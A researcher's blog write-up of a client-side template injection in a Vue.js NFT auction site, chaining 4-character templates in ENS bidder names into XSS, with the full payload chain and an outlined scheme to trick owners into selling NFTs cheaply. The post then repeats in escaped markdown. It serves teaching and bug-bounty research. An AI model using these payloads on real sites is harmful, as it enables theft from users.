---
source: matanber
source_url: https://matanber.com/blog/4-char-csti
title: "Bidding Like a Billionaire - Stealing NFTs With 4-Char CSTIs - Matan Berson"
published: 2024-07-11T00:00:00.000Z
description: "A story about an incredibly impactful XSS vulnerability I found using a client side template injection which was limited to 4 characters."
---

.

# Bidding Like a Billionaire - Stealing NFTs With 4-Char CSTIs

# Challenge

If you want to try to discover and exploit the bug detailed in this blog post yourself, you can do so with the following [challenge](https://github.com/matanber/mnmlsm). It is quite a hard bug to exploit, so if you don't want to spend a lot of time on this challenge I'd recommend reading a bit from this blog post whenever you get stuck.

# Background

Inspired by Sam Curry's [blog post](https://samcurry.net/universal-xss-on-netlifys-next-js-library) on exploiting web3 sites using regular web hacking techniques, a slightly younger version of me was determined to find an impactful bug on a web3-related bug bounty program. After looking at a few options, I decided to test for bugs in some huge NFT company, who had an official website for one of their NFT series. The biggest NFT sale in the series was for above **$20M**, so naturally I wanted to find a bug that would let an attacker steal an NFT from users on the site, as that would obviously be super impactful.

After noticing that the site was build with the [Vue.js](https://vuejs.org/), I started looking for **Client Side Template Injection** (CSTI) bugs.

# A Brief Into to CSTI [(skip intro)](https://matanber.com/blog/4-char-csti\#skip-dest)

Many sites use frontend frameworks like Vue.js or Angular to ease the development of the site. A very common feature in these frameworks is **templates**. This feature lets developers safely and easily insert the value of some JavaScript varaible into the HTML of their site. The specific way this feature works depends on the configuration and usage of the framework, but in many cases it works like this:

1. The developer writes some HTML code with the template syntax, which looks something like this:

```
<div id="some-element-id">
    <p>
        Hello {{ username }}, your balance is {{ balance }}
    </p>
    <!-- [...] -->
</div>
```

2. Then, the developer tells the framework to "look" at the element where all of the templates exist. In Vue.js, this is done using the following code:

```
import { createApp } from 'vue';

const app = createApp();
app.mount("#some-element-id");
```

3. Finally, the framework will look for templates in the element which it was asked to look at. The framework will find the `{{ username }}` and `{{ balance }}` templates, and automatically replace them in the HTML with the values of the appropriate JS variables. For example, if the `username` is `<h1>test</h1>` and the `balance` is `$6`, the result would be:

```
<div id="some-element-id">
    <p>
        Hello &lt;h1&gt;test&lt;/h1&gt;, your balance is $6
    </p>
    <!-- [...] -->
</div>
```

However, this feature can be very problematic if attacker-controlled input is somehow reflected into the content of some element which a framework is "looking" at. For example, consider the following PHP code:

```
<div id="some-element-id">
    <p>
        Hello <?php echo htmlentities($_GET["uname"]) ?>
    </p>
    <!-- [...] -->
</div>
```

In this code, the attacker-controlled `uname` parameter is properly encoded before it is inserted into the HTML, so normally there wouldn't be an issue here. However, an attacker can exploit the templates feature of the frontent framework used in the site to get XSS. For example, if the value of the `uname` parameter is `{{7*9}}`, then the response of the PHP server would be

```
<div id="some-element-id">
    <p>
        Hello {{7*9}}
    </p>
    <!-- [...] -->
</div>
```

When the page is rendered, the framework will parse and execute the templates in the `<div id="some-element-id">` element, including the attacker's malicious template. After the framework does so, the resulting HTML would be:

```
<div id="some-element-id">
    <p>
        Hello 63
    </p>
    <!-- [...] -->
</div>
```

By providing a more complicated template such as `{{_s.constructor("alert(origin)")()}}` (this payload will be explained later in this post) as the malicious input, an attacker can get the frontend framework to execute arbitrary JS code.

# XSSing the NFT Site

## Finding a CSTI

Because the NFT site was using Vue.js, I started looking for client side template injection bugs. To do so, I searched for elements which Vue was told to "look" at, so I could then try to inject malicious templates into them. After looking at a few of theses elements, I found one that seemed interesting.

The site included a seperate page for every NFT in the series, which all looked something like this:

![NFT page screenshot](https://matanber.com/images/blog/nft-page.png)

In every one of those pages there was a `div` element containing some information about the NFT. Because Vue was looking at that element, I knew that if I managed to inject malicious input into it somehow then I would probably have an XSS, but I didn't immediately see any obvious way to do that. The only part of that element which I had some control over as an attacker was a table which included all of the bids which were made for the NFT. This table included a few fields describing each bid, such as the address of the bidder, the bid amount, and the time the bid was submitted.

At first glance, none of these fields seemed like a promising injection point, as I had very limited control over them, but then I noticed that some rows in the table included the ENS name of the bidder instead of their ETH address. An ENS name is pretty much the equivalent of a domain name for ETH addresses, as it lets you reference a long ETH address with a short human-readable name, such as `myaddress.eth`. This fact was interesting, because I remembered there was a trick I saw somewhere that lets an attacker register ENS names that include arbitrary characters. To test whether I could exploit that trick in order to get CSTI on the targrt, I registered an ENS name that looked something like `{{3*3}}a.eth` and submitted a very low bid for one of the NFTs. When I looked at the NFT page, I noticed the template injection was successful, and the bid table included a row with a "bidder" field of `9a...`.

Normally, this would be the end of it. I'd register an ENS name with a template that causes XSS, submit a bid for one of the NFTs, and now every person that would visit the NFT page would get malicious JS code run in their browser. However, there was a big issue preventing this attack from working. The site was truncating all of the ENS names, and was only including the first 8 characters of every name in the bid table. This meant that every template I injected into the NFT page had to be at most 8-characters long. Because every template has to start with `{{` and end with `}}`, I really only had 4 characters of JavaScript per template to work with. Obviously, this shouldn't be enough to get an XSS in the page, but I decided to try and get it anyways.

## Vue.js Template Internals

Because all of the well-documented malicious Vue template payloads were much longer than 8 characters, I had to do some research and make my own payloads. To do so, I started looking into how the template rendering functionality in Vue.js worked. In the Vue.js version which the target was using, this feature worked as follows:

1. Vue searches for templates in the HTML of the element it was told to look at.
2. Vue takes all of the templates and puts them all in one big function. For example, for the templates `{{tst1}}` and `{{tst2}}`, this function would something look like this (the templates are inserted in calls to the `_s` function):

```
(function anonymous() {
    with (this) {
        return _c('div', {
            attrs: {
                "id": "content"
            }
        }, [_m(0), _v(" "), _c('div', {\
            staticClass: "seperator"\
        }), _v(" "), _c('div', {\
            staticClass: "container"\
        }, [_c('p', [_c('b', [_v("$1.0")]), _v(" by "), _c('b', [_v(_s(tst1}}))]), _v(" - "), _c('span', {\
            staticClass: "date"\
        }, [_v("13:58 Jun 06, 2024")])]), _v(" "), _c('p', [_c('b', [_v("$1.0")]), _v(" by "), _c('b', [_v(_s(tst2))]), _v(" - "), _c('span', {\
            staticClass: "date"\
        }, [_v("13:57 Jun 06, 2024")])]), _v(" "), _m(1), _v(" "), _m(2), _v(" "), _m(3)])])
    }
})
```

3. Vue evaluates the function, calls it, and changes the content of the page according to the return value.

## Constructing an Arbitrary String

Equipped with some knowledge about how templates work in Vue, I started trying to build the payload. My goal was to make the page execute arbitrary JS code, so at the very least I had to have the ability to include a long string of malicious JS code in the payload. This looked like a pretty good place to start, so I started looking for ways to construct an arbitrary string and store it in a variable. Eventually, I figured out how I could construct an arbitrary string and put it in a variable.

If I insert the templates ``{{a=`}}``, `{{hhhh}}` and ``{{`}}``, then Vue would construct the following function:

```
(function anonymous() {
    with (this) {
        return _c('div', {
            attrs: {
                "id": "content"
            }
        }, [_m(0), _v(" "), _c('div', {\
            staticClass: "seperator"\
        }), _v(" "), _c('div', {\
            staticClass: "container"\
        }, [_c('p', [_c('b', [_v("$1.0")]), _v(" by "), _c('b', [_v(_s(a=`1))]),_v(" - "),_c('span',{staticClass:"date"},[_v("14:10 Jun 06, 2024")])]),_v(" "),_c('p',[_c('b',[_v("$1.0")]),_v(" by "),_c('b',[_v(_s(hhhh))]),_v(" - "),_c('span',{staticClass:"date"},[_v("13:58 Jun 06, 2024")])]),_v(" "),_c('p',[_c('b',[_v("$1.0")]),_v(" by "),_c('b',[_v(_s(`))]), _v(" - "), _c('span', {\
            staticClass: "date"\
        }, [_v("13:57 Jun 06, 2024")])]), _v(" "), _m(1), _v(" "), _m(2), _v(" "), _m(3)])])
    }
})
```

This would result in a long string with some "h"s in the middle of it being stored in the variable `a`. This could easily be developed into something a bit more useful. If we insert the templates `{{z=70}}`, `{{z+=z}}`, ``{{a=`}}``, `{{hhhh}}` and ``{{`[z]}}``, only the character at index 140 of the string will be stored in the variable `a`, which in this case is one of the "h"s that we have injected. This is basically equivalent to the code `a="h"`.

If we repeat this payload, and use ``{{a+=`}}`` instead of ``{{a=`}}``, we could construct an arbitrary string and store it in the variable `a`, just like we wanted. For example, injecting the following templates:

```
{{z=70}}
{{z+=z}} // z = 140
{{a=`}}
{{hhhh}}
{{`[z]}} // a = "h"
{{a+=`}}
{{xxxx}}
{{`[z]}} // a = "hx"
{{a+=`}}
{{xxxx}}
{{`[z]}} // a = "hxx"
{{a+=`}}
{{dddd}}
{{`[z]}} // a = "hxxd"
```

Would result in the string "hxxd" being stored in the variable `a`. For brevity, whenever I use this string-construction process in some payload in the rest of this blog post, I will write it as `{{a="some string"}}` instead of writing out all of the templates.

## "We Have eval at Home" - Getting Access to the Function Constructor

As you may know, almost anything you can put in a variable in javascript is an object. This includes functions, which weirdly enough means that javascript has a function class. That class has a constructor, the `Function()` constructor, which when called with a string as an argument creates a new function with that string as its body. In other words, the `Function()` constructor takes a string as an input and converts it to an executable function! This means the constructor can act as a sort of alternative to the eval function, when used like this:

```
Function("alert('something')")()
```

The constructor turns the string into a function, which is subsequently called, resulting in the evaluation of the string.

A reference to this constructor can be gotten either through the global `Function` variable, which is unavailable inside the environment of a Vue template, or via the `constructor` property of any function object (e.g. `alert.constructor`). This is exactly how the typical Vue.js malicios template payload - `{{_s.constructor("alert()")()}}` works. Because `_s` is a function that's accessible from inside a Vue template, `_s.constructor` returns the `Function()` constructor, which is then used to evaluate arbitrary JS code.

Knowing that, I had a general plan as to how I could use the arbitrary string construction method I had in order to execute arbitrary JS code and get XSS:

1. Get a reference to the function constructor through the `constructor` property of some function, and store it in a variable.
2. Call the constructor with an arbitrary string as an argument.
3. Call the result

Step 1 sounds easy enough, but any method I tried to get a reference to the constructor required a payload longer than 4 characters. Eventually though, I found something that helped me do this. In the environemnt where the Vue templates are evaluated, there was a function called `_f` which was accessible. When that function was called with garbage as an argument, it logged a warning to the console and returned some function. Along with this gadget, I used a trick in javascript where writing a function name followed by backtick (\`) characters calls that function. For example, `alert` can be called using ``alert`blah```.

Using those two things, I managed to store a reference to the function constructor in some variable `x` by injecting the following templates:

```
{{a="constructor"}} // Use the arbitrary string construction method
{{f=_f}} // The varaible name "_f" is too long so we shorten it to "f"
{{x=f`}} // Call the function "f"
{{`[a]}} // Close the call, and access the "constructor" property of the result
```

As a result of this, the function constructed by Vue would look something like this (but with lots of different payloads constructing the string "constructor" instead of one `a="constructor"` payload):

```
(function anonymous() {
    with (this) {
        return _c('div', {
            attrs: {
                "id": "content"
            }
        }, [_m(0), _v(" "), _c('div', {\
            staticClass: "seperator"\
        }), _v(" "), _c('div', {\
            staticClass: "container"\
        }, [_c('p', [_c('b', [_v("$1.0")]), _v(" by "), _c('b', [_v(_s(a="constructor"))]), _v(" - "), _c('span', {\
            staticClass: "date"\
        }, [_v("14:10 Jun 06, 2024")])]), _v(" "), _c('p', [_c('b', [_v("$1.0")]), _v(" by "), _c('b', [_v(_s(f=_f))]), _v(" - "), _c('span', {\
            staticClass: "date"\
        }, [_v("13:58 Jun 06, 2024")])]), _v(" "), _c('p', [_c('b', [_v("$1.0")]), _v(" by "), _c('b', [_v(_s(x=f`))]),_v(" - "),_c('span',{staticClass:"date"},[_v("13:57 Jun 06, 2024")])]),_v(" "),_c('p',[_c('b',[_v("$1.0")]),_v(" by "),_c('b',[_v(_s(`[a]))]), _v(" - "), _c('span', {\
            staticClass: "date"\
        }, [_v("13:50 Jun 06, 2024")])]), _v(" "), _m(1), _v(" "), _m(2), _v(" "), _m(3)])])
    }
})
```

As a result of all of that, a reference to the `Function()` constructor will be stored in the variable `x`!

## Evaluating Arbitrary JS Code

Now all that's left for us to do is complete steps 2 and 3 of the plan - call `x` with a malicious string and call the result. After messing around a bit, I found a very clever way to do just that.

As you may have noticed, in the function generated by Vue, every one of our inputs is put inside of a call to `_s`. I was able to abuse that fact by injecting the following templates (together with all of the templates from the last section):

```
{{a="alert(origin)"}} // Construct a malicious JS payload using the string-construction method
{{_s=x}} // Override the "_s" variable with the variable x, which stores the Function() constructor
{{a)(}}
```

When Vue tries to put the input inside a call to `_s` the result is `_s(a)()`. Because we have overriden the variable `_s` with the `Function()` constructor, executing that result would construct a function with our arbitrary JS payload as its body and then call that function, evaluating our malicious JS code!

## Putting it All Together

Putting all of those payloads together, the abstracted payload would look something like this:

```
{{a="constructor"}} // Use the arbitrary string construction method
{{f=_f}} // The varaible name "_f" is too long so we shorten it to "f"
{{x=f`}} // Call the function "f"
{{`[a]}} // Close the call, and access the "constructor" property of the result
{{a="alert(origin)"}} // Construct a malicious JS payload using the string-construction method
{{_s=x}} // Override the "_s" variable with the variable x, which stores the Function() constructor
{{a)(}}
```

And the actual payload would look something like this:

```
{{z=70}}
{{z+=z}}
{{a=`}}
{{cccc}}
{{`[z]}}
  ...
{{a+=`}}
{{rrrr}}
{{`[z]}}
{{f=_f}} // The varaible name "_f" is too long so we shorten it to "f"
{{x=f`}} // Call the function "f"
{{`[a]}} // Close the call, and access the "constructor" property of the result
{{a=`}}
{{aaaa}}
{{`[z]}}
  ...
{{a+=`}}
{{))))}}
{{`[z]}}
{{_s=x}} // Override the "_s" variable with the variable x, which stores the Function() constructor
{{a)(}}
```

For each tempalte in the payload, I could register an invalid ENS name and submit a low bid for some NFT. After all of the bids would be submitted, whenever somebody navigates to that NFT's page, my payload would trigger, and our malicious JS code would be executed in their browser.

## Exploitation

This vulnerability could have been exploited in order to steal NFTs using the following attack:

1. As the attacker, I submit a very low bid on some NFT I want to steal.
2. I register all of the invalid ENS names and submit low bids on the same NFT.
3. Once the owner of the NFT navigates to this NFT's page, our malicious payload triggers.
4. Our payload edits the DOM so that it looks like the bid we submitted in step 1 is for $5,000,000,000.
5. The victim clicks to accept the bid, and is prompted by metamask to confirm this transaction.
6. The prompt doesn't include the bid amount, so the victim confirms it, and their NFT is transferred to the attacker for a very low price.

# Conclusion

In hacking, and in my opinion especially in black box testing, persistence is key. At multiple points while researching this bug I thought it's probably not possible to fully exploit it. However, I've still persisted with this research, and in retrospect I am very glad I did so as I learned a lot while doing it. For that reason, even if the bug ended up not being exploitable the research still would have been worth doing. To be clear, I'm not saying that you should always be persistent and sink a lot of time into every attack scenario or lead you find, some ideas just don't work. Whether to continue researching a seemingly hopeless bug or to move on is a decision you have to make, and I hope this bug would serve as a helpful example for you when you're making that decision.

On a more technical note, if you're a hacker and you encounter a target that's using a frontend framework that supports templates - be on the lookout for elements which the framework is "looking" at, and try to find a way to inject malicious input into them. If you're a developer, be very careful in situations where you're reflecting data into such elements.

\# Challenge
If you want to try to discover and exploit the bug detailed in this blog post yourself, you can do so with the following \[challenge\](https://github.com/matanber/mnmlsm). It is quite a hard bug to exploit, so if you don't want to spend a lot of time on this challenge I'd recommend reading a bit from this blog post whenever you get stuck.

&nbsp;
\# Background
Inspired by Sam Curry's \[blog post\](https://samcurry.net/universal-xss-on-netlifys-next-js-library) on exploiting web3 sites using regular web hacking techniques, a slightly younger version of me was determined to find an impactful bug on a web3-related bug bounty program. After looking at a few options, I decided to test for bugs in some huge NFT company, who had an official website for one of their NFT series. The biggest NFT sale in the series was for above \*\*$20M\*\*, so naturally I wanted to find a bug that would let an attacker steal an NFT from users on the site, as that would obviously be super impactful.
\
After noticing that the site was build with the \[Vue.js\](https://vuejs.org/), I started looking for \*\*Client Side Template Injection\*\* (CSTI) bugs.
&nbsp;

\# A Brief Into to CSTI <a href="#skip-dest">(skip intro)</a>
Many sites use frontend frameworks like Vue.js or Angular to ease the development of the site. A very common feature in these frameworks is \*\*templates\*\*. This feature lets developers safely and easily insert the value of some JavaScript varaible into the HTML of their site. The specific way this feature works depends on the configuration and usage of the framework, but in many cases it works like this:
1\. The developer writes some HTML code with the template syntax, which looks something like this:
\`\`\`html
<div id="some-element-id">
<p>
Hello {{ username }}, your balance is {{ balance }}
</p>
<!\-\- \[...\] -->
</div>
\`\`\`
2\. Then, the developer tells the framework to "look" at the element where all of the templates exist. In Vue.js, this is done using the following code:
\`\`\`js
import { createApp } from 'vue';

const app = createApp();
app.mount("#some-element-id");
\`\`\`
3\. Finally, the framework will look for templates in the element which it was asked to look at. The framework will find the \`{{ username }}\` and \`{{ balance }}\` templates, and automatically replace them in the HTML with the values of the appropriate JS variables. For example, if the \`username\` is \`<h1>test</h1>\` and the \`balance\` is \`$6\`, the result would be:
\`\`\`html
<div id="some-element-id">
<p>
Hello &lt;h1&gt;test&lt;/h1&gt;, your balance is $6
</p>
<!\-\- \[...\] -->
</div>
\`\`\`
\
However, this feature can be very problematic if attacker-controlled input is somehow reflected into the content of some element which a framework is "looking" at. For example, consider the following PHP code:
\`\`\`php
<div id="some-element-id">
<p>
Hello <?php echo htmlentities($\_GET\["uname"\]) ?>
</p>
<!\-\- \[...\] -->
</div>
\`\`\`
In this code, the attacker-controlled \`uname\` parameter is properly encoded before it is inserted into the HTML, so normally there wouldn't be an issue here. However, an attacker can exploit the templates feature of the frontent framework used in the site to get XSS. For example, if the value of the \`uname\` parameter is \`{{7\*9}}\`, then the response of the PHP server would be
\`\`\`html
<div id="some-element-id">
<p>
Hello {{7\*9}}
</p>
<!\-\- \[...\] -->
</div>
\`\`\`
When the page is rendered, the framework will parse and execute the templates in the \`<div id="some-element-id">\` element, including the attacker's malicious template. After the framework does so, the resulting HTML would be:
\`\`\`html
<div id="some-element-id">
<p>
Hello 63
</p>
<!\-\- \[...\] -->
</div>
\`\`\`
By providing a more complicated template such as \`{{\_s.constructor("alert(origin)")()}}\` (this payload will be explained later in this post) as the malicious input, an attacker can get the frontend framework to execute arbitrary JS code.
&nbsp;<span id="skip-dest"></span>
\# XSSing the NFT Site
\## Finding a CSTI
Because the NFT site was using Vue.js, I started looking for client side template injection bugs. To do so, I searched for elements which Vue was told to "look" at, so I could then try to inject malicious templates into them. After looking at a few of theses elements, I found one that seemed interesting.
The site included a seperate page for every NFT in the series, which all looked something like this:
<img alt="NFT page screenshot" src="/images/blog/nft-page.png" width="500rem">
In every one of those pages there was a \`div\` element containing some information about the NFT. Because Vue was looking at that element, I knew that if I managed to inject malicious input into it somehow then I would probably have an XSS, but I didn't immediately see any obvious way to do that. The only part of that element which I had some control over as an attacker was a table which included all of the bids which were made for the NFT. This table included a few fields describing each bid, such as the address of the bidder, the bid amount, and the time the bid was submitted.
\
At first glance, none of these fields seemed like a promising injection point, as I had very limited control over them, but then I noticed that some rows in the table included the ENS name of the bidder instead of their ETH address. An ENS name is pretty much the equivalent of a domain name for ETH addresses, as it lets you reference a long ETH address with a short human-readable name, such as \`myaddress.eth\`. This fact was interesting, because I remembered there was a trick I saw somewhere that lets an attacker register ENS names that include arbitrary characters. To test whether I could exploit that trick in order to get CSTI on the targrt, I registered an ENS name that looked something like \`{{3\*3}}a.eth\` and submitted a very low bid for one of the NFTs. When I looked at the NFT page, I noticed the template injection was successful, and the bid table included a row with a "bidder" field of \`9a...\`.
\
Normally, this would be the end of it. I'd register an ENS name with a template that causes XSS, submit a bid for one of the NFTs, and now every person that would visit the NFT page would get malicious JS code run in their browser. However, there was a big issue preventing this attack from working. The site was truncating all of the ENS names, and was only including the first 8 characters of every name in the bid table. This meant that every template I injected into the NFT page had to be at most 8-characters long. Because every template has to start with \`{{\` and end with \`}}\`, I really only had 4 characters of JavaScript per template to work with. Obviously, this shouldn't be enough to get an XSS in the page, but I decided to try and get it anyways.

&nbsp;
\## Vue.js Template Internals
Because all of the well-documented malicious Vue template payloads were much longer than 8 characters, I had to do some research and make my own payloads. To do so, I started looking into how the template rendering functionality in Vue.js worked. In the Vue.js version which the target was using, this feature worked as follows:

1\. Vue searches for templates in the HTML of the element it was told to look at.
2\. Vue takes all of the templates and puts them all in one big function. For example, for the templates \`{{tst1}}\` and \`{{tst2}}\`, this function would something look like this (the templates are inserted in calls to the \`\_s\` function):
\`\`\`js
(function anonymous() {
with (this) {
return \_c('div', {
attrs: {
"id": "content"
}
}, \[\_m(0), \_v(" "), \_c('div', {\
staticClass: "seperator"\
}), \_v(" "), \_c('div', {\
staticClass: "container"\
}, \[\_c('p', \[\_c('b', \[\_v("$1.0")\]), \_v(" by "), \_c('b', \[\_v(\_s(START\_HIGHLIGHTtst1END\_HIGHLIGHT}}))\]), \_v(" - "), \_c('span', {\
staticClass: "date"\
}, \[\_v("13:58 Jun 06, 2024")\])\]), \_v(" "), \_c('p', \[\_c('b', \[\_v("$1.0")\]), \_v(" by "), \_c('b', \[\_v(\_s(START\_HIGHLIGHTtst2END\_HIGHLIGHT))\]), \_v(" - "), \_c('span', {\
staticClass: "date"\
}, \[\_v("13:57 Jun 06, 2024")\])\]), \_v(" "), \_m(1), \_v(" "), \_m(2), \_v(" "), \_m(3)\])\])
}
})
\`\`\`
3\. Vue evaluates the function, calls it, and changes the content of the page according to the return value.

\## Constructing an Arbitrary String
Equipped with some knowledge about how templates work in Vue, I started trying to build the payload. My goal was to make the page execute arbitrary JS code, so at the very least I had to have the ability to include a long string of malicious JS code in the payload. This looked like a pretty good place to start, so I started looking for ways to construct an arbitrary string and store it in a variable. Eventually, I figured out how I could construct an arbitrary string and put it in a variable.
If I insert the templates \`\`{{a=\`}}\`\`, \`\`{{hhhh}}\`\` and \`\`{{\`}}\`\`, then Vue would construct the following function:
\`\`\`js
(function anonymous() {
with (this) {
return \_c('div', {
attrs: {
"id": "content"
}
}, \[\_m(0), \_v(" "), \_c('div', {\
staticClass: "seperator"\
}), \_v(" "), \_c('div', {\
staticClass: "container"\
}, \[\_c('p', \[\_c('b', \[\_v("$1.0")\]), \_v(" by "), \_c('b', \[\_v(\_s(START\_HIGHLIGHTaEND\_HIGHLIGHT=\`1))\]),\_v(" - "),\_c('span',{staticClass:"date"},\[\_v("14:10 Jun 06, 2024")\])\]),\_v(" "),\_c('p',\[\_c('b',\[\_v("$1.0")\]),\_v(" by "),\_c('b',\[\_v(\_s(START\_HIGHLIGHThhhhEND\_HIGHLIGHT))\]),\_v(" - "),\_c('span',{staticClass:"date"},\[\_v("13:58 Jun 06, 2024")\])\]),\_v(" "),\_c('p',\[\_c('b',\[\_v("$1.0")\]),\_v(" by "),\_c('b',\[\_v(\_s(\`))\]), \_v(" - "), \_c('span', {\
staticClass: "date"\
}, \[\_v("13:57 Jun 06, 2024")\])\]), \_v(" "), \_m(1), \_v(" "), \_m(2), \_v(" "), \_m(3)\])\])
}
})
\`\`\`
This would result in a long string with some "h"s in the middle of it being stored in the variable \`a\`. This could easily be developed into something a bit more useful. If we insert the templates \`\`{{z=70}}\`\`, \`\`{{z+=z}}\`\`, \`\`{{a=\`}}\`\`, \`\`{{hhhh}}\`\` and \`\`{{\`\[z\]}}\`\`, only the character at index 140 of the string will be stored in the variable \`a\`, which in this case is one of the "h"s that we have injected. This is basically equivalent to the code \`a="h"\`.
If we repeat this payload, and use \`\`{{a+=\`}}\`\` instead of \`\`{{a=\`}}\`\`, we could construct an arbitrary string and store it in the variable \`a\`, just like we wanted. For example, injecting the following templates:
\`\`\`
{{z=70}}
{{z+=z}} // z = 140
{{a=\`}}
{{hhhh}}
{{\`\[z\]}} // a = "h"
{{a+=\`}}
{{xxxx}}
{{\`\[z\]}} // a = "hx"
{{a+=\`}}
{{xxxx}}
{{\`\[z\]}} // a = "hxx"
{{a+=\`}}
{{dddd}}
{{\`\[z\]}} // a = "hxxd"
\`\`\`
Would result in the string "hxxd" being stored in the variable \`a\`. For brevity, whenever I use this string-construction process in some payload in the rest of this blog post, I will write it as \`{{a="some string"}}\` instead of writing out all of the templates.
&nbsp;
\## "We Have eval at Home" - Getting Access to the Function Constructor
As you may know, almost anything you can put in a variable in javascript is an object. This includes functions, which weirdly enough means that javascript has a function class. That class has a constructor, the \`Function()\` constructor, which when called with a string as an argument creates a new function with that string as its body. In other words, the \`Function()\` constructor takes a string as an input and converts it to an executable function! This means the constructor can act as a sort of alternative to the eval function, when used like this:
\`\`\`js
Function("alert('something')")()
\`\`\`
The constructor turns the string into a function, which is subsequently called, resulting in the evaluation of the string.
A reference to this constructor can be gotten either through the global \`Function\` variable, which is unavailable inside the environment of a Vue template, or via the \`constructor\` property of any function object (e.g. \`alert.constructor\`). This is exactly how the typical Vue.js malicios template payload - \`{{\_s.constructor("alert()")()}}\` works. Because \`\_s\` is a function that's accessible from inside a Vue template, \`\_s.constructor\` returns the \`Function()\` constructor, which is then used to evaluate arbitrary JS code.
\
Knowing that, I had a general plan as to how I could use the arbitrary string construction method I had in order to execute arbitrary JS code and get XSS:
1\. Get a reference to the function constructor through the \`constructor\` property of some function, and store it in a variable.
2\. Call the constructor with an arbitrary string as an argument.
3\. Call the result

Step 1 sounds easy enough, but any method I tried to get a reference to the constructor required a payload longer than 4 characters. Eventually though, I found something that helped me do this. In the environemnt where the Vue templates are evaluated, there was a function called \`\_f\` which was accessible. When that function was called with garbage as an argument, it logged a warning to the console and returned some function. Along with this gadget, I used a trick in javascript where writing a function name followed by backtick (\\\`) characters calls that function. For example, \`alert\` can be called using \`\`alert\`blah\` \`\`.
Using those two things, I managed to store a reference to the function constructor in some variable \`x\` by injecting the following templates:
\`\`\`
{{a="constructor"}} // Use the arbitrary string construction method
{{f=\_f}} // The varaible name "\_f" is too long so we shorten it to "f"
{{x=f\`}} // Call the function "f"
{{\`\[a\]}} // Close the call, and access the "constructor" property of the result
\`\`\`
As a result of this, the function constructed by Vue would look something like this (but with lots of different payloads constructing the string "constructor" instead of one \`a="constructor"\` payload):
\`\`\`js
(function anonymous() {
with (this) {
return \_c('div', {
attrs: {
"id": "content"
}
}, \[\_m(0), \_v(" "), \_c('div', {\
staticClass: "seperator"\
}), \_v(" "), \_c('div', {\
staticClass: "container"\
}, \[\_c('p', \[\_c('b', \[\_v("$1.0")\]), \_v(" by "), \_c('b', \[\_v(\_s(START\_HIGHLIGHTaEND\_HIGHLIGHT="constructor"))\]), \_v(" - "), \_c('span', {\
staticClass: "date"\
}, \[\_v("14:10 Jun 06, 2024")\])\]), \_v(" "), \_c('p', \[\_c('b', \[\_v("$1.0")\]), \_v(" by "), \_c('b', \[\_v(\_s(START\_HIGHLIGHTfEND\_HIGHLIGHT=\_f))\]), \_v(" - "), \_c('span', {\
staticClass: "date"\
}, \[\_v("13:58 Jun 06, 2024")\])\]), \_v(" "), \_c('p', \[\_c('b', \[\_v("$1.0")\]), \_v(" by "), \_c('b', \[\_v(\_s(START\_HIGHLIGHTxEND\_HIGHLIGHT=f\`))\]),\_v(" - "),\_c('span',{staticClass:"date"},\[\_v("13:57 Jun 06, 2024")\])\]),\_v(" "),\_c('p',\[\_c('b',\[\_v("$1.0")\]),\_v(" by "),\_c('b',\[\_v(\_s(\`\[START\_HIGHLIGHTaEND\_HIGHLIGHT\]))\]), \_v(" - "), \_c('span', {\
staticClass: "date"\
}, \[\_v("13:50 Jun 06, 2024")\])\]), \_v(" "), \_m(1), \_v(" "), \_m(2), \_v(" "), \_m(3)\])\])
}
})
\`\`\`
As a result of all of that, a reference to the \`Function()\` constructor will be stored in the variable \`x\`!
&nbsp;
\## Evaluating Arbitrary JS Code
Now all that's left for us to do is complete steps 2 and 3 of the plan - call \`x\` with a malicious string and call the result. After messing around a bit, I found a very clever way to do just that.
As you may have noticed, in the function generated by Vue, every one of our inputs is put inside of a call to \`\_s\`. I was able to abuse that fact by injecting the following templates (together with all of the templates from the last section):
\`\`\`
{{a="alert(origin)"}} // Construct a malicious JS payload using the string-construction method
{{\_s=x}} // Override the "\_s" variable with the variable x, which stores the Function() constructor
{{a)(}}
\`\`\`
When Vue tries to put the input inside a call to \`\_s\` the result is \`\_s(a)()\`. Because we have overriden the variable \`\_s\` with the \`Function()\` constructor, executing that result would construct a function with our arbitrary JS payload as its body and then call that function, evaluating our malicious JS code!
&nbsp;
\## Putting it All Together
Putting all of those payloads together, the abstracted payload would look something like this:
\`\`\`
{{a="constructor"}} // Use the arbitrary string construction method
{{f=\_f}} // The varaible name "\_f" is too long so we shorten it to "f"
{{x=f\`}} // Call the function "f"
{{\`\[a\]}} // Close the call, and access the "constructor" property of the result
{{a="alert(origin)"}} // Construct a malicious JS payload using the string-construction method
{{\_s=x}} // Override the "\_s" variable with the variable x, which stores the Function() constructor
{{a)(}}
\`\`\`
And the actual payload would look something like this:
\`\`\`
{{z=70}}
{{z+=z}}
{{a=\`}}
{{cccc}}
{{\`\[z\]}}
...
{{a+=\`}}
{{rrrr}}
{{\`\[z\]}}
{{f=\_f}} // The varaible name "\_f" is too long so we shorten it to "f"
{{x=f\`}} // Call the function "f"
{{\`\[a\]}} // Close the call, and access the "constructor" property of the result
{{a=\`}}
{{aaaa}}
{{\`\[z\]}}
...
{{a+=\`}}
{{))))}}
{{\`\[z\]}}
{{\_s=x}} // Override the "\_s" variable with the variable x, which stores the Function() constructor
{{a)(}}
\`\`\`
For each tempalte in the payload, I could register an invalid ENS name and submit a low bid for some NFT. After all of the bids would be submitted, whenever somebody navigates to that NFT's page, my payload would trigger, and our malicious JS code would be executed in their browser.
&nbsp;
\## Exploitation
This vulnerability could have been exploited in order to steal NFTs using the following attack:
1\. As the attacker, I submit a very low bid on some NFT I want to steal.
2\. I register all of the invalid ENS names and submit low bids on the same NFT.
3\. Once the owner of the NFT navigates to this NFT's page, our malicious payload triggers.
4\. Our payload edits the DOM so that it looks like the bid we submitted in step 1 is for $5,000,000,000.
5\. The victim clicks to accept the bid, and is prompted by metamask to confirm this transaction.
6\. The prompt doesn't include the bid amount, so the victim confirms it, and their NFT is transferred to the attacker for a very low price.

&nbsp;
\# Conclusion
In hacking, and in my opinion especially in black box testing, persistence is key. At multiple points while researching this bug I thought it's probably not possible to fully exploit it. However, I've still persisted with this research, and in retrospect I am very glad I did so as I learned a lot while doing it. For that reason, even if the bug ended up not being exploitable the research still would have been worth doing. To be clear, I'm not saying that you should always be persistent and sink a lot of time into every attack scenario or lead you find, some ideas just don't work. Whether to continue researching a seemingly hopeless bug or to move on is a decision you have to make, and I hope this bug would serve as a helpful example for you when you're making that decision.
\
On a more technical note, if you're a hacker and you encounter a target that's using a frontend framework that supports templates - be on the lookout for elements which the framework is "looking" at, and try to find a way to inject malicious input into them. If you're a developer, be very careful in situations where you're reflecting data into such elements.